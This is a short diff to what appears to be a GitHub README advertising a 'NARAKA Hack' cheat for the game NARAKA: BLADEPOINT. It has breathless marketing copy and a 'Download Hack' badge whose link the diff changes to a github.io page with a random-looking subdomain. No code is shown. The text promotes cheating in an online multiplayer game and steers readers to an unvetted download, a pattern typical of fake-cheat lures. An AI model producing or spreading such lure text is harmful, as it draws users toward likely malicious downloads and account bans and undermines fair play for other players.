@@ -4,7 +4,7 @@
 
 **NARAKA: BLADEPOINT** isn’t your average BR—it’s a sweaty, combo-heavy martial arts battle royale that punishes even tiny mistakes. But if you’re done getting third-partied mid-heal or out-parried in sweaty 1v1s, the **NARAKA Hack** gives you the tools to dominate **every duel, every drop, every time**. 💣
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://NARAKA-BLADEPOINT-Hack-fefu7.github.io/.github)
 ---
 
 ## 🐲 What Is This Hack?
